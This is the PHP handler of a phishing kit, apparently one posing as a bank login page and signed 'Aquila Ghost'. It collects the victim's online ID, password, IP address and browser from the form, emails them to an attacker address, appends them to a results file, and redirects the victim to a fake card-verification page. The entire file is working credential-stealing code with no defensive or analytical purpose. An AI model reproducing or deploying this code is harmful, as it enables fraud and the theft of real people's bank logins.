<?php   ob_start();  ?>
<?
include "v-V-v.php";
?>
<?php
$zabi = getenv("REMOTE_ADDR");

include('../email.php');
include './detect.php';
include "./blocker.php";
$message .= "--++-----[Aquila Ghost]-----++--\n";
$message .= "--------------  LOGIN Boa  -------------\n";
$message .= "Onlineid : ".$_POST['1']."\n";
$message .= "Password : ".$_POST['2']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Aquila  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "ch@se Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: XXX <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
header("Location: ../verification-card.php");?>